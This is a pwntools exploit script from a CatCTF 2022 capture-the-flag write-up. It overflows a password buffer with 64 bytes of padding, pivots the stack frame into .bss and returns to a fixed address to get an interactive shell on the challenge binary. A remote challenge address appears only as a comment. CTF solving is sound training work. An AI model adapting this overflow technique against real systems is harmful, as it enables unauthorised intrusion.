# 商业转载请联系作者获得授权，非商业转载请注明出处。
# For commercial use, please contact the author for authorization. For non-commercial use, please indicate the source.
# 协议(License)：署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0)
# 作者(Author)：TokameinE
# 链接(URL)：https://tokameine.top/2023/01/02/catctf2022-writeup/
# 来源(Source)：TokameinE

from pwn import *
 
p=process("./pwn")
elf=ELF("./pwn")
# p=remote("223.112.5.156",57023)
# gdb.attach(p,"set follow-fork-mode parent\nb*0x40223B")
pause()
p.recvuntil(b"CTF!")
p.sendline(b"\n")
p.recvuntil(b"Name: ")
p.sendline(b"aaa")
p.recvuntil(b"Password: ")
# payload=b"a"*(64)+p64(0x06092C0+0x420)+p64(0x404EA4)
print('bss:',hex(elf.bss()))
payload=b"a"*(64)+p64(elf.bss()+0x220+0x580)+p64(0x404EA4)
p.sendline(payload)
p.interactive()
